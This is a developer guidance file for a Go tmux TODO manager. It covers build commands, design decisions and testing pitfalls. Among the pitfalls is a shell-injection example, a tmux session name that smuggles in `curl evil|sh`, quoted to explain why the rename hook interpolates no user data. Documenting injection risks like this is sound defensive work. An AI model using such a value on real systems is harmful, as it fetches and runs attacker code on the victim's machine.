# tmux-todo (`tdo`)

tmux-native TODO manager: a `display-popup` TUI over a local SQLite store, tasks
scoped `session` / `dir` / `global`. `docs/design.md` is the agreed design and
wins over any task brief that contradicts it; `docs/tasks/` is the work queue.

## Commands

```sh
make build      # CGO_ENABLED=0 static binary -> ./bin/tdo
make test       # go test ./...
make test-plugin # the TPM plugin's shell harness; needs a tmux binary, NOT in `make test`
make lint       # go vet ./... + gofmt check
./bin/tdo doctor          # schema version, journal mode, task counts
./bin/tdo doctor --db X   # ...against a throwaway database
```

Go must resolve from `/opt/homebrew/bin/go` (1.26.x). The Go 1.19 tarball at
`/usr/local/go/bin/go` is too old for these deps and cannot self-upgrade: if a
shell picks it up, fix PATH rather than downgrading dependencies.

## Layout

- `cmd/tdo` — thin `main`, delegates to `internal/cli` so commands stay testable.
- `internal/task` — domain types (`Task`, `ScopeKind`). No I/O.
- `internal/store` — SQLite: `Open` (pragmas + migrate), task CRUD, and
  `migrations/NNN_*.sql` run by `migrate.go`. Environment-blind by design: it
  takes `task.Scope` values and never asks tmux or the filesystem anything.
- `internal/scope` — pane → scope resolution (`Resolver`/`Resolved`), the pure-Go
  git root walker, and the sticky default kind. Injectable: tests need neither a
  tmux server nor a git checkout. Three ways to ask tmux about a session, and the
  differences are load-bearing: `Resolve` (untargeted — needs a client, so never
  from a hook), `SessionID(name)` (targeted by `=name:`) and `EnvSession`
  (targeted by the id in `$TMUX`, the only one a client-less hook child can trust).
- `internal/tui` — Bubble Tea popup: the merged task list. Environment-blind by
  design — it takes a `Config` (store, resolved scopes, home dir, version) from
  `internal/cli` and never resolves a scope or reads the clock itself, so
  `Update`/`View` are testable without tmux. Row formatting lives in `render.go`
  as pure functions.
- `internal/tui` also holds the input row (`input.go`, `field.go`), the deferred
  delete queue (`delete.go`), the `y` copy (`copy.go`) and the done-row placement
  (`donerows.go`). All are pure model state; the
  only I/O any of them does is a store command, or the injected `Config.Copy`, returned
  from `Update`. `internal/cli/copy.go` is the other half of that seam: `tmux load-buffer`
  inside tmux, a hand-written OSC 52 escape outside it.
- `tmux-todo.tmux` — the TPM plugin entry point (bash 3.2; macOS has no newer one).
  Resolves the binary, installs the keybind (with `-e TDO_POPUP_KEY` on root-table installs, so
  the popup can close on the key that opened it) and the rename hook. tmux sources it on
  **every server start**, so the resolved path stays cheap. `test/plugin_install_test.sh`
  drives it against private `tmux -L` servers; `make test-plugin` runs that.
- `.github/workflows/ci.yml` — three jobs: `go` on ubuntu **and** macOS (which *asserts*
  the runner has no tmux), `plugin` on ubuntu (installs tmux, runs `make test-plugin`), and
  a `build` matrix cross-compiling the four release targets. Go comes from
  `go-version-file: go.mod`, never a literal.
- `.github/workflows/release.yml` — a `v*` tag builds `tdo-<goos>-<goarch>` for
  darwin/{arm64,amd64} and linux/{amd64,arm64}, verifies the native one, writes
  `checksums.txt` and publishes with `gh`. **Asset names are a contract the plugin
  computes** — renaming one breaks every installed plugin at its next server start.
- `internal/cli` — stdlib `flag` with manual subcommand dispatch. `env.filter` is the single
  place `list` and `count` turn a `selector` (`--scope` / `--session` / `--dir`, mutually
  exclusive) into a `store.Filter`, so the two commands cannot disagree about what a flag means.
  Also owns the two tmux-facing side jobs: refreshing the `session_id -> name` map on every resolve
  (`openEnv`) and the `session-renamed` subcommand the tmux hook calls.

## Decisions worth knowing

- **`modernc.org/sqlite`, not `mattn/go-sqlite3`.** Pure Go buys `CGO_ENABLED=0`
  and a genuinely static binary, at ~2-3x query time — irrelevant here.
  `otool -L bin/tdo` must never show libsqlite3.
- **Bubble Tea + lipgloss**: the popup stays open across actions.
- **No cobra.** A handful of commands does not justify it on a hot path; cold
  start is ~8ms and should stay under 100ms — popup latency is the product.
- **Migrations are embedded `.sql` files run by a hand-rolled runner.** To add
  one, drop in `internal/store/migrations/002_*.sql`; filename order decides, and
  `store.SchemaVersion()` follows. Each file runs in one transaction that also
  bumps `schema_version`. Never edit an applied migration — add the next one.
- **Timestamps are INTEGER unix seconds.** The `id DESC` tiebreak keeps
  newest-first stable within a second, so milliseconds were unnecessary.
- **The store never reads the clock**: `DB.now` is a field tests freeze.
  `PurgeDone` takes an explicit cutoff — the 24h retention *policy* belongs to
  the completed-task-lifecycle task.
- **Tests use real SQLite files in `t.TempDir()`**, never a mocked store.
- **Scope keys are durable database keys**: absolute, cleaned, symlink-resolved,
  never case-folded. Changing a rule after v1 ships is a data migration, so the
  rules are pinned by tests. Git worktrees fold into their main repo (so
  `../todo-<task>` shares the parent's list) while submodules keep their own —
  `TestAgreesWithGitBinary` holds both to what real git reports.
- **Absent beats empty.** Outside tmux there is no session scope rather than a
  `""` key, and `--session` errors; the sticky default stores a *kind*, never a
  key, in the XDG *state* dir, and a corrupt file falls back silently.
- **`tdo list --json` is a published contract**, not a debug dump: an object
  wrapper (an array can never gain a sibling field), RFC3339 **UTC** timestamps,
  nested `scope`, `done_at` null rather than omitted, `{"tasks":[]}` never `null`,
  and HTML escaping off so task prose survives as itself. `internal/cli/json.go`
  is that contract alone, pinned bytewise by `testdata/list.json`. Cosmetic churn
  there is a breaking change for anyone's script.
- **Version** is stamped via `-ldflags -X .../internal/cli.Version`. It lives in the popup's
  `?` overlay, **not** the footer: the footer has 42 columns in the design's own popup, and a
  `git describe` stamp plus a keymap does not fit — truncation would eat the keys silently.
- **`y` copies through tmux's buffer, and the text goes on STDIN.** `tmux load-buffer -w -`
  with `exec.Command`'s `Stdin`, never `set-buffer <text>`: a task's text is user data and
  there is no tmux format that escapes for a shell, so this is the rename hook's injection
  bug one argv over. `-w` is what forwards to the system clipboard and needs tmux >= 3.2, so
  a `-w` failure retries without it and **reports success** — the paste buffer still filled,
  and overloading the error return with a warning would make "a failing copy says so" mean
  two things. `set-clipboard off` in a user's config is the same shape and also not a
  failure. Outside tmux it is a hand-written OSC 52 escape in **one** `io.WriteString`: Bubble
  Tea renders into the same tty from another goroutine, and a torn escape is garbage on
  screen rather than a failed copy. A terminal that ignores OSC 52 is indistinguishable from
  one that honoured it, so a nil error means "tdo wrote the sequence", nothing stronger.
- **Done rows are re-ordered in `internal/tui`, never in the store's `ORDER BY`.** A completed
  row within 24h sits at the end of its scope tier, `done_at` DESC, and that is a *layout*
  decision — `tdo list` shares `listOrder`/`groupedOrder`, so sorting there would silently
  reorder a published command's output as a side effect of a popup change.
  `internal/tui/donerows.go`'s `partitionDone` is a pure function applied at the two points
  rows are built (the `rowsMsg` handler and `visibleGroups`), and
  `internal/cli/testdata/list.json` is the tripwire that says the CLI stayed put. Tiers are read
  off the rows as runs of equal `Scope.Kind` rather than by walking `task.ScopeKinds()`: a tier
  with no pending rows would otherwise merge into its neighbour.
- **The 24h retention window was dead code for four tasks.** `doneSince()` returned the *later*
  of "popup opened" and "now − 24h", and the open time is later for every popup not left
  running for a day — so `store.DoneRetention` never bit and a row completed before you arrived
  was already gone. Fixed 2026-08-21 by deleting the `openedAt` arm, which also required
  *amending `docs/design.md`* (the old wording specified the behaviour being removed). A
  constant that exists, is tested, and is unreachable in production is not caught by any test
  that injects around it — the tests all froze the clock *and* set `openedAt`.
- **`d` in the popup queues; the DELETE runs at close.** `u` un-hides rather than
  re-inserts, which is the only way the row comes back with its original id, timestamp and
  position (`store.Add` would assign new ones and move it to the top of its tier). The costs
  are deliberate: a queued row is still visible to a concurrent `tdo list`, and an unclean
  death commits nothing. Both fail towards keeping the user's data.
- **`bubbles/textinput` is not free even though `bubbles` is already required.** It imports
  `github.com/atotto/clipboard`, which is in neither `go.sum` nor the module cache, so using
  it means a new module in the build graph. `internal/tui/field.go` is a ~150-line one-line
  editor instead. Check the *transitive* imports before assuming a subpackage of an existing
  dependency is a free upgrade.
- **The plugin's five-step chain puts the download at step 3, and keeps `go build` at
  step 4.** Ahead of it a user's own `tdo` still wins and an existing install is still
  reused, so nothing that worked before stops working; behind it the source build is what
  keeps a machine with no network or an unshipped platform working. Every step-3 failure
  falls through — nothing in the install path may fail a tmux server start.
- **Checksum verification is best-effort, and the three outcomes are deliberately
  asymmetric.** Match → use it. **Mismatch → delete it and fall through, never execute
  it.** No `checksums.txt` and no `sha256sum`/`shasum` → use it *unverified* with a
  one-off `display-message`. "Best-effort" relaxes what happens when the checksums file is
  *unavailable*, not what happens when it says no. The residual risk (an attacker who can
  serve a binary while suppressing the checksums file) is accepted and written down in
  `docs/design.md`; signatures are the real fix and are out of scope.
- **`/releases/latest/download/<asset>`, never the GitHub API.** That URL redirects to the
  current release, so the plugin needs no JSON, no `jq`, and is not subject to the
  unauthenticated rate limit — which a script sourced on every tmux server start would be
  an excellent way to hit. It is also why the version lives in the URL and not the asset
  name.
- **The session scope key is the session *name*, so renames need a map.** tmux gives a
  `session-renamed` hook only the *new* name; the old one — the key the tasks are filed
  under — is already gone. The `session_id` survives the rename, so v2's `sessions` table
  maps id -> name and `tdo session-renamed` recovers the old key from it. Filing tasks
  under the id instead was rejected: ids reset when the server restarts, so every reboot
  would orphan every session task. The map is best-effort by construction (it only knows
  sessions tdo has run in) and the all-tasks view's re-home is the backstop.

## Pitfalls

- **Per-connection pragmas ride on the DSN** (`?_pragma=busy_timeout(5000)&...`),
  not a post-open `Exec`: `database/sql` pools connections, so an `Exec`-applied
  pragma reaches one connection and silently misses the rest.
- **`journal_mode` is the exception and must NOT be a DSN pragma.** It is a
  property of the file, and SQLite refuses to change it while another connection
  is reading — answering `SQLITE_BUSY` *without* consulting `busy_timeout`. On
  the DSN it fires on every new pooled connection, so concurrent first opens
  fail outright. `Open` calls `ensureJournalMode` once, with a retry.
- **Concurrent first open is the dangerous window**, not steady state: the
  migration runner holds one `BEGIN IMMEDIATE` transaction across the version
  read and the apply loop, so the losing process waits and then sees the version
  already current. Tests that race an *already-migrated* database prove nothing
  about this — that was the DoD-9 gap that shipped a bug.
- **A test that injects a dependency cannot prove the production default is
  wired.** This has now shipped two bugs. `scope.Resolve()` was
  `Resolver{}.Resolve()` with an empty `TmuxEnv`, so session scope was
  unreachable in the binary while all 28 tests passed — every one of them set
  `TmuxEnv` by hand. Whenever a seam has a zero value that *means* something
  (here `""` = "not inside tmux"), the constructor is the thing to test: exercise
  the real entry point and assert it agrees with an explicitly-wired one.
  **But "agrees with the environment" is vacuous when the environment is empty** —
  `NewResolver().TmuxEnv == os.Getenv("TMUX")` is `"" == ""` outside tmux, so that
  guard passes against the very bug it was written for on any tmux-less CI runner.
  Fake the environment (`t.Setenv("TMUX", "/tmp/fake,1,0")`) so the assertion has
  something to be wrong about; keep the live-tmux test as a separate, skippable leg.
- **A DoD can specify a vacuous test.** `completed-task-lifecycle` DoD 6 asked for
  "complete a mid-list row, assert the cursor still points at that task" — which
  passes with the id-anchoring code deleted, because completing a row does not
  reorder the list, so the index lands on the same task anyway. The guard that
  discriminates is `TestCursorReAnchorsWhenRowsShift`: another pane inserting rows
  shifts every index. Delete the implementation and re-run before believing a test
  covers what its name claims; a green test whose subject is gone is evidence of
  nothing. Both tests stayed in the tree, and the close-out records which one is the
  real guard.
- **The vacuous cursor test became a real guard, because completing a row now reorders.**
  CLAUDE.md recorded `TestCursorReAnchorsOnTaskID` as passing with the id-anchoring code
  deleted, since completing a row did not move it and the index landed on the same task anyway.
  Since the 24h task a completed row moves to the end of its tier, so that test now *fails*
  when the anchor is removed (verified by mutation, alongside
  `TestCursorReAnchorsWhenRowsShift`). Both remain; the point worth keeping is that "is this
  test vacuous?" is a question about the *code around it*, and the answer changes when that
  code does — a test can silently acquire or lose its teeth without being edited.
- **A multi-statement `Exec` applies statements up to the first failure** and
  leaves them there — hence the transaction around each migration. That per-file
  unit is a `SAVEPOINT` *inside* the one outer `BEGIN IMMEDIATE`, so a failed
  migration rolls back to its savepoint and the outer transaction still
  **commits** — earlier migrations survive and the version tracks the last
  success. Looks wrong at a glance; it is what makes partial upgrades sane.
- **WAL means sidecars.** `tasks.db-wal` / `tasks.db-shm` sit beside the database
  while a connection is open; backup or sync work must account for them. A clean
  `Close` checkpoints them away.
- Raw `sqlite3` output shows integer timestamps: read them with
  `datetime(created_at, 'unixepoch')`.
- The popup overlay cannot be asserted headlessly — `display-popup` needs an
  attached client. Automated checks run the TUI in a plain tmux pane
  (`tmux new-session -d … 'bin/tdo tui'` + `capture-pane`) instead. `tdo tui` has
  no `--db` flag, but `store.DefaultPath` honours **`$XDG_DATA_HOME`**, so point
  that at a temp dir, create the schema with `tdo doctor --db …`, seed rows with
  the `sqlite3` CLI, and the capture is reproducible without touching the real
  database. Worth the trouble: this is the only check that catches whole-frame
  bugs, and it has caught three the unit tests could not see.
- **Unit tests over `renderRows` do not test the assembled frame.** All three frame
  bugs so far were in the *arithmetic between* correct pieces: `chromeHeight` must
  count the box's two border rows and both blank lines (not just title and footer),
  `View` must not append a trailing newline, and `footer()` went untruncated while
  `chromeHeight` assumed it was one row. A frame taller than the pane makes the
  terminal **scroll**, so the rows that disappear are the top ones (session tier,
  tier labels), not the bottom.
- **Every line `View` assembles must be truncated to `contentWidth`, not just the
  task rows.** lipgloss *wraps* an over-wide line rather than clipping it, so one
  long chrome line silently becomes two rows and the frame outgrows `chromeHeight`.
  The footer was the case that shipped: its width is `36 + len(Version)` and the
  Makefile stamps `Version` from `git describe --tags --always --dirty`, so the
  minimum usable popup width **depended on the build's git state** — a `-dirty`
  describe needed 78 columns where `dev` needed 58, against the ~48 that
  `design.md:47`'s 60%x60% gives on an 80x20 terminal. Truncate the plain text and
  let the styles wrap the result; slicing a *rendered* string cuts through an ANSI
  escape.
- **`TestFrameNeverExceedsThePane` closes that class — and it must assert on the
  unclamped `frame()`, never on `View()`.** `View` applies a `clampHeight`
  backstop, so an assertion over its output absorbs any `chromeHeight` miscount and
  stays green; the same mutation against `frame()` fails 216 assertions. Assert that
  the backstop *did not fire* alongside the dimensions. A safety net that hides the
  bug it catches is worse than no net, and this pattern has now caught itself once.
- **A one-row invariant belongs to the RENDERER, not to whoever sets the field.** The `y`
  copy's notice replaces the title line, so it must be exactly one row; the collapse that
  guarantees it (`oneLine`, whitespace to single spaces) started out in the code that *sets*
  the notice and moved into `titleLine`. `truncate` clips columns and nothing else clips
  rows, so a task text holding a newline is a second row that `chromeHeight` never counted —
  the fourth instance of this repo's one recurring frame bug. Pinned by
  `TestFrameNeverExceedsThePane`'s `copied hostile` mode, which sets `m.notice` **directly**
  rather than pressing `y`: that is what makes the assertion about the renderer instead of
  about one caller, and it is what caught the collapse being in the wrong place. Dropping
  `oneLine` from `titleLine` fails 432 assertions.
- **A tmux buffer fills before the popup repaints, and a harness that polls the buffer then
  captures the screen loses that race.** `copy-1`'s first version asserted the on-screen
  `copied:` notice from a capture taken the instant `show-buffer` answered — but the buffer
  is filled by the copy subprocess, which returns before Bubble Tea has handled the
  resulting message. The buffer assertion passed and the notice assertion failed with the
  feature entirely correct. Poll for each observable separately; "the side effect landed"
  is not "the frame has been redrawn".
- **A row wider than the viewport is silently clipped, not wrapped.** That is how
  tier labels vanished for real dir keys: a dir scope key is an absolute path, and
  a label sized from "whatever width is left" gets no width at all. `columns()`
  guarantees labels a share and left-truncates them (the path *tail* identifies
  it); `TestRowsNeverExceedTheirWidth` holds every row to its budget.
- **`capture-pane -pe` interleaves escapes *between words*.** A styled row comes back as
  `^[[2;9mrebase^[[0;9m ^[[2monto^[[0;9m ^[[2mmain^[[0m`, so grepping the capture for a
  multi-word phrase finds nothing even though the phrase is on screen. Grep for one word, or
  for the escape itself. An empty grep here is a capture artifact, not a missing row — it cost
  half an hour once.
  **And SGR 9 never arrives alone, so `grep '\[9m'` answers zero for a row that IS struck
  through.** A done row emits `^[[2;9m` / `^[[0;9m` — strikethrough combined with faint — so
  the pattern that works is `;9m`. This note used to say "`[9m` is strikethrough", and that
  spelling cost another half hour: the capture looked like proof that done rows rendered
  unstyled, which would have been a real bug. Dump the distinct codes
  (`grep -o $'\x1b\[[0-9;]*m' | sort -u`) before believing a style is absent.
- **lipgloss styles render to plain text in tests** — a test process has no colour
  profile, so asserting on rendered ANSI passes whatever style was chosen. Assert
  on the style object instead (`textStyle(...).GetStrikethrough()`) and prove the
  escapes ship with `capture-pane -pe`.

- **Never interpolate a tmux format into a `run-shell` string.** Two separate traps meet
  there. First, `#{session_id}` expands to `$0` and `run-shell` hands its argument to `sh`,
  which expands `$0` to `sh` — so the id arrives as the literal string "sh". Second, and
  worse: a session *name* is user data, and no tmux format escapes for a shell
  (`#{q:...}` escapes for tmux's own parser), so `'#{hook_session_name}'` in sh single
  quotes executes for a session called `x'; curl evil|sh; '`. Verified on tmux 3.7b, and
  the reason the installed hook is the bare `run-shell -b 'tdo session-renamed'`: the child
  inherits `$TMUX`, whose third field is the session the hook fired for, so `tdo` asks tmux
  itself and nothing is interpolated. That also fixes what the argument form could not — a
  name containing `:` cannot be used as a tmux target at all.
  **But the inheritance only gets you the id — "so tmux will answer for that session" was
  wrong, and it shipped a bug.** tmux resolves "current session" from the *client*, and a
  `run-shell` child has none, so an untargeted `display-message` falls back to another session
  entirely: measured on 3.7b, a hook child whose `$TMUX` ended in `,100` was told
  `session_name=todo` / `session_id=$24`. `session-renamed` then compared the wrong session's
  name against the map, saw no rename, and exited 0 with the tasks stranded under the old name —
  silent, and inert only because the wrong id usually *misses* the map; when it hits, an
  unrelated session's list gets rewritten. Fixed by `scope.EnvSession`, which builds the target
  from `$TMUX`'s third field and asks **targeted** (`display-message -t "$100" -p
  '#{session_name}'`). Interpolating *that* is safe where a name is not — the field is a decimal
  number, checked before use, so no user data reaches the command line — and it reaches names the
  `=name:` form cannot, since `:` is the character tmux splits a target on. A `$TMUX` it cannot
  parse is an **error, never a fallback to the untargeted query**: that fallback is the bug.
  **The reason it survived Checkpoint 2: the original evidence ran the command by hand in a
  pane, and a pane HAS a client.** A manual test of this command proves nothing about the hook,
  and neither does a Go test that calls `runSessionRenamed` directly. The guards are
  `TestSessionRenamedHookIgnoresTheClientlessSession` (a fake whose *untargeted* answer differs
  from its targeted one — that asymmetry is the whole point, and a fake without it hides the
  bug) and the `rename-*` cases in `test/plugin_install_test.sh`, which fire a real hook on a
  real server. Both are needed; neither is sufficient.
  **And the client-less fallback sometimes lands on the RIGHT session**, which is how a real
  end-to-end rename test can pass with the bug fully present — it did, on a two-session server.
  So every rename case first asserts what a client-less child resolves to and that it is *not*
  the session under test (`assert_fallback_is_not`). tmux appears to pick the most recently
  active session, so the decoy is seeded *last*.
  **Corollary for probing this at all: tmux DOES expand `#{...}` in a `run-shell` argument
  before `sh` sees it.** A canary running `display-message -p "…#{session_id}"` printed `00` —
  the server expanded the format to `$100` inside the string and `sh` read that as `${1}00`. So
  a canary meant to observe the *child's* view must contain no formats: put it in a script file
  and pass only plain arguments, or it silently reports the server's view and reads as though
  the child agreed.
- **The popup closes on the key that opened it, and the key travels
  `@todo-key` -> `display-popup -e TDO_POPUP_KEY` -> `tui.Config.CloseKey` -> `Update`.** tmux
  cannot do this itself: while a `display-popup` has focus the outer client's binding never
  fires and there is no popup key table to bind a closer in, so only `tdo` can act on the second
  press. An env var rather than `tdo` asking tmux, because the popup's cold start is the product
  and a second `display-message` would spend ~5ms of it on every open.
  **Only for `@todo-key-table root`.** With a prefix table the opening chord is prefix+key, the
  prefix cannot reach a focused popup, and a bare-key closer is a *different* key from the
  opener. Prefix installs get a byte-identical bind body to before.
  **Existing popup bindings win**: the close check runs *after* each mode's key switch, so a
  `@todo-key` of `a` or `d` keeps its job and simply does not close. That is structural rather
  than a rule each call site remembers.
- **Never hand-write a Bubble Tea key string; derive it from `tea.KeyMsg.String()`.** The value
  has to equal what `Update` compares against, and the spellings are not guessable: tmux's
  `C-Space` is Bubble Tea's **`ctrl+@`** (the terminal sends NUL), and `C-i`/`C-m` come back as
  `tab`/`enter`. `internal/cli/popupkey.go` therefore builds every result by constructing the
  KeyMsg and asking it, and ctrl+letter is computed as `tea.KeyType(c-'a'+1)` rather than
  tabulated — which gets those collisions right for free. An unrecognised name yields `""`,
  meaning no close key: a *wrong* key would either never fire or shadow a binding, and "" is
  what every install had before the feature existed.
- **`tea.KeySpace` is not `tea.KeyRunes`, and an Alt-modified rune IS `KeyRunes`.** Both bite
  the same predicate. `internal/tui/field.go`'s `isTextKey` is the one definition of "the input
  row would type this": it must include `KeySpace` (or a `@todo-key` of `Space` quits the popup
  instead of inserting a space) and must exclude `msg.Alt` (or `alt+t` counts as text, so an alt
  close key silently does nothing in the input row — and `alt+<rune>` inserted a bare letter,
  which it had been doing all along). Both directions are mutation-proven; the plan's literal
  `msg.Type != tea.KeyRunes` fails the space leg.
- **Which key NAMES tmux accepts is version-dependent, so a case built on one must probe, not
  version-sniff.** `'`, `"`, `M-'` and `C-"` all bind on 3.7b; ubuntu's 3.4 rejects at least one,
  which turned `closekey-6-quote-in-key-*` red in CI for a reason that was not the plugin's.
  `test/plugin_install_test.sh`'s `tmux_can_bind` asks the running tmux by binding into a private
  `tdo-keyprobe` table on its own server — a `tmux -V` comparison would encode today's guess about
  which release changed the parser and go stale silently. Three properties make the skip safe, and
  all three are mutation-proven: it **fails open** (no usable probe server ⇒ "bindable", so cases
  run unguarded rather than silently vanishing); a key tmux *really* rejects, with the probe forced
  to say yes, **fails** the case rather than skipping it; and `closekey-6-quote-key-coverage` fails
  the suite outright if zero keys were bindable, because a group that skipped everything reports
  success for no coverage. That last guard is the one worth copying: **any per-item skip needs a
  companion assertion that not every item skipped.**
- **tmux re-quotes a key name when it prints it, and the spelling depends on the key.** `t`
  comes back bare, `'` as `\'`, `M-'` as `"M-'"`, `C-"` as `'C-"'`. So `list-keys | awk '$4 == k'`
  answers "not bound" for a key sitting right there — an assertion of zero passes, which is the
  wrong direction. `test/plugin_install_test.sh`'s `KEY_AWK` unquotes field 4 first; it is a
  no-op for bare keys.
  Related: **tmux rejects a malformed key name outright** (`unknown key: C-l'x`) — but it rejects
  `C-lx` too, so the quote is not what makes it invalid. `'`, `"`, `M-'` and `C-"` are all real,
  bindable keys. A test meaning to cover "a quote in the key name" must use one of those, or it
  is testing an invalid key name instead.
- **`set-hook -g` replaces; `set-hook -ga` appends.** A plugin must append or it silently
  eats the user's own `session-renamed` hook. The cost is that re-running the install
  stacks duplicate copies (`show-hooks -g` shows `session-renamed[0]`, `[1]`, …); the hook
  body is idempotent, so this is noise rather than a bug.
- **`display-popup` does not expand formats in `-w`/`-h`** — tmux 3.7b answers `width
  invalid`. A floored size therefore has to be a *branch* (`if-shell -F`), not an
  expression. Two more traps in that condition: `#{>=:x,y}` compares **strings**, so
  `#{>=:80,100}` is *true*; use arithmetic instead (`#{m:-*,#{e|-|:#{client_width},100}}`
  is "narrower than 100"). And `display-message -p` **eats a literal `%`**, so a probe
  printing `60%` shows `60` — which is how a wrong condition can look right.
- **Popup percentages are of the *client*, and the popup's border costs 2×2.** `-w 60 -h 15`
  hands the TUI a 58×13 pane; `-w 60% -h 60%` on an 80×24 client hands it 46×12. Use
  `#{client_width}`/`#{client_height}` in the size condition, not `window_*`.
- **The popup overlay *can* be captured headlessly, with a nested client.** CLAUDE.md used
  to say otherwise. `display-popup` needs an attached client, and one can be manufactured:
  create two sessions, run `TMUX= tmux -L <sock> attach -t work` *inside* the first
  session's pane, and that pane becomes a real 80×24 client for `work`. Send `C-b T` to the
  outer pane and `capture-pane` it: the popup, its border and the frame inside it are all
  in the capture. This is how the keybind, the computed size and the footer width were
  proven; `-c <client>` is also what makes a scripted `display-popup` stop answering
  "no current client".
- **`show-hooks -g` prints a bare `session-renamed` line when there are ZERO hooks.**
  So `show-hooks -g | grep -c session-renamed` answers 1 for an empty hook list, and any
  de-dup built on a *name* grep silently skips installing the hook — the failure direction
  that leaves the rename broken. Grep the hook's **body** instead. Both halves are proven by
  mutation: delete the guard and hooks stack `[0][1][2]`; make it a name grep and the hook is
  never installed at all. The body grep must also be **path-specific**, or an install at a
  new path matches the stale hook and skips itself, leaving only the broken one.
- **A whole `if-shell` brace block can be passed as ONE shell argument to `bind-key`.**
  `tmux-integration-and-rename-hook`'s handoff said the brace form needs `source-file` or
  careful nested quoting to install from a shell. It does not:
  `tmux bind-key -T prefix t "if-shell -F '…' { … }"` hands tmux's own parser exactly the
  text it wants, and `list-keys` renders it
  byte-identically to `source-file`-ing the same snippet. No temp file, no escaping.
  Verified on tmux 3.7b. What *cannot* be escaped is a quote inside the interpolated path —
  tmux's single-quoted strings have no escape character — so a path containing `'` or `"` is
  treated as a resolution failure rather than a keybind that breaks on press.
- **`show-option -gqv <unset-option>` prints NOTHING — not even a newline.** So
  `tmux show-option -gqv @x \; show-hooks -g` cannot be split on the first line: when the
  option is unset, line 1 is `after-bind-key`, the first hook, and gets read as the value.
  Combining a read with another read to save a round-trip is not safe here; combining the
  two *writes* is.
- **tmux's default prefix table already binds `t` (clock-mode) and `w` (choose-tree).**
  A test that counts bindings for a key therefore counts tmux's own and passes with the
  plugin deleted — the vacuous-guard trap again. Count bindings whose *command* is the
  plugin's (`display-popup`), and assert the total for the key is 1 so a second binding is
  still caught.
- **A sandboxed `PATH` in a shell test is a vacuous-test machine.** `env -i PATH=$only_stubs`
  left no `bash` (so the script never ran and 22 assertions "failed" for the wrong reason)
  and no `grep` (so the hook guard silently never executed). Put the system tool dirs on the
  sandbox PATH and sandbox only the binaries under test — then assert the sandbox really
  lacks them, so the suite fails loudly instead of degrading if `tdo` or `go` shows up in
  `/usr/bin` later.
- **A tmux hook child inherits the SERVER's environment — not a pane's, and not the
  harness's.** So `XDG_DATA_HOME` exported in a pane, or in the shell that sends keys, does not
  reach it: `tdo session-renamed` opens `store.DefaultPath()`, i.e. **the developer's real
  database**. Three reproduction attempts died this way, and they reached the real database
  (harmlessly, by luck: the private server's low session ids were absent from the real map).
  Set it when the server *starts* — `case_start` takes `VAR=VALUE` arguments for exactly this —
  and assert `show-environment -g XDG_DATA_HOME` afterwards. Safety requirement, not tidiness.
- **`$TMUX_PANE` IS set for a pane's initial command**, so
  `new-session -d -s alpha "tdo add --session x; exec sleep 300"` files the task under alpha
  correctly and is the deterministic way to seed a session-scoped task in the harness — no
  shell, no keystrokes, nothing to race. (`exec sleep` is load-bearing: a pane whose command
  exits takes the session with it.)
  **CLAUDE.md claimed the opposite for one commit.** The probe behind that claim ran
  `printenv TMUX TMUX_PANE`, which reported only the first variable, so `TMUX_PANE` looked
  absent; `printenv TMUX_PANE` alone prints `%1`. Ask for one variable per probe, or the
  absence you observe is the tool's and not the environment's.
- **Driving an interactive shell with `send-keys` needs a readiness handshake, and is still
  the flakier choice.** Keystrokes sent before the shell reads them are buffered, so a
  poll-and-resend loop made a slow rc run all four queued commands and seed four copies of one
  task; the handshake that fixed it then timed out under load, because the rc files are slow.
  Prefer a pane command over `send-keys` whenever the thing being run does not need a
  line editor.
- **`python3 -m http.server` needs `-u` when its output is redirected.** The
  "Serving HTTP on 127.0.0.1 port NNNNN" line is buffered otherwise, so a harness that
  reads the port out of the log never finds one. That does not fail: `serve_fixture` fell
  back to `file://` and the download suite stayed green at 118/118 while silently losing
  the two legs the server exists for — a real HTTP 404 (which is what makes `curl -f`
  load-bearing) and wget, which rejects `file://` URLs outright.
- **`curl` without `-f` saves the 404 page and exits 0.** For the plugin's download step
  that means `bin/tdo` becomes an HTML document the keybind then points at. Proven by
  mutation: drop the `-f` and `dl-3-asset-404` installs the error page and binds a key to
  it. `wget` needs `-q` for the same reason.
- **A `... | while read` loop in the harness runs in a SUBSHELL**, so every `ok`/`bad`
  inside increments `PASS`/`FAIL` in a child and the summary never sees them — six rows of
  `uname` assertions that could not fail the suite. Iterate with `for` over a
  colon-delimited list instead. Same family as every other vacuous-guard trap here: the
  test *ran*, and its result went nowhere.
- **`curl`/`wget` cannot be sandboxed by shadowing.** "No downloader on this box" means
  `command -v curl` *fails*, and a stub makes it succeed. `test/plugin_install_test.sh`
  builds a second PATH by symlinking every system binary **except** those two — by
  wildcard, not a curated list, because a tool missing from a hand-written list (`grep`,
  `mktemp`) makes the case pass for the wrong reason. It asserts both directions at
  startup, and `dl-8b` is the positive control: the same sandbox *with* curl must download.
- **`t.TempDir()` is itself under a symlink on macOS** (`/var` -> `/private/var`),
  so scope tests compare against `normalizePath(tmp)`, never the raw temp path.
- **Resolution costs one `tmux display-message`** (~5ms of a ~5.7ms cold median),
  one call for both formats. If the popup ever needs those milliseconds back, the
  lever is tmux expanding `#{...}` straight into the `display-popup` command.
- **A value-taking flag whose next token is another flag is REJECTED, not swallowed** —
  `splitArgs` refuses it for every such flag (`--db`, `--scope`, `--session`, `--dir`), and the
  escape is the `=` form. The guard lives there rather than per-command because the hazard is a
  property of "this flag consumes the next token", which is the question `takesValue` already
  answers. `--scope` was only ever safe by *accident*: `tdo list --scope --json` set the value
  to `"--json"` and failed solely because that is not a valid scope kind. A **session or
  directory name has no vocabulary**, so `tdo list --session --json` exited 0 with an empty
  list and `--json` silently dropped — measured before the guard existed, and the reason it
  exists. Consequence: `--session=-json` is how a value that starts with a dash is passed, and
  that escape is tested in both directions, because a guard that traded a silent bug for a hard
  block would be its own bug.
- **`fs.String`'s pointer cannot tell "absent" from "present but empty"** — both read as `""`.
  For a scope selector those are different questions: `tdo list --session=` is a query no task
  can match, while no `--session` at all means "the active merged set", so conflating them
  silently lists *here* in answer to a question about somewhere else. `newSelector` reads the
  flags back through **`fs.Visit`**, which reports only what was actually given; the empty value
  is then a usage error. Whenever a flag's zero value *means* something, `Visit` is the seam,
  not the pointer — the same shape as `scope.Resolver`'s `TmuxEnv == ""` trap.
- **`--session`/`--dir` on `list`/`count` ask about stored rows; `--scope` asks about here.**
  So the named ones never consult tmux, never error, and answer an empty list with exit 0 — a
  killed or renamed session is exactly the list worth asking for. Ruling A (an unavailable
  `--scope` exits 1) is about the *current* context only, and conflating the two would put
  Ruling A's failure in front of the query that most needs to succeed.
